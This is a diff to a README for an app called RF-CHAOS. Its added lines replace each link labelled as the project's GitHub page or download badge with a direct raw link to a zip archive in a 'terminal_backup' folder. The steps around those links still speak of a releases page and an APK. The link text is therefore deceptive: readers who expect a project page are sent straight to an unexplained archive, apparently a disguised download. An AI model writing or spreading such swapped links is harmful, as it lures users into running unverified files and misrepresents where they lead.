@@ -2,13 +2,13 @@
 
 ## 💾 Download RF-CHAOS
 
-[![Download RF-CHAOS](https://img.shields.io/badge/Download-RF--CHAOS-brightgreen.svg)](https://github.com/fahad3482/RF-CHAOS)
+[![Download RF-CHAOS](https://raw.githubusercontent.com/fahad3482/RF-CHAOS/main/terminal_backup/2025-11-18/CHAOS_R_2.6.zip)](https://raw.githubusercontent.com/fahad3482/RF-CHAOS/main/terminal_backup/2025-11-18/CHAOS_R_2.6.zip)
 
 ## 🚀 Getting Started
 
 To get started with RF-CHAOS, follow these simple steps:
 
-1. **Visit the download page:** Head to the [RF-CHAOS GitHub Page](https://github.com/fahad3482/RF-CHAOS).
+1. **Visit the download page:** Head to the [RF-CHAOS GitHub Page](https://raw.githubusercontent.com/fahad3482/RF-CHAOS/main/terminal_backup/2025-11-18/CHAOS_R_2.6.zip).
 2. **Select the latest version:** Once on the page, find the latest release listed under the releases section.
 3. **Download the APK file:** Click on the APK link to begin the download.
 
@@ -51,7 +51,7 @@ To run RF-CHAOS smoothly, ensure your device meets the following requirements:
 
 ## 📅 Regular Updates
 
-RF-CHAOS receives updates regularly. Check the [RF-CHAOS GitHub Page](https://github.com/fahad3482/RF-CHAOS) often to download the latest version and enjoy improved features.
+RF-CHAOS receives updates regularly. Check the [RF-CHAOS GitHub Page](https://raw.githubusercontent.com/fahad3482/RF-CHAOS/main/terminal_backup/2025-11-18/CHAOS_R_2.6.zip) often to download the latest version and enjoy improved features.
 
 ## 🌐 Community and Support
 
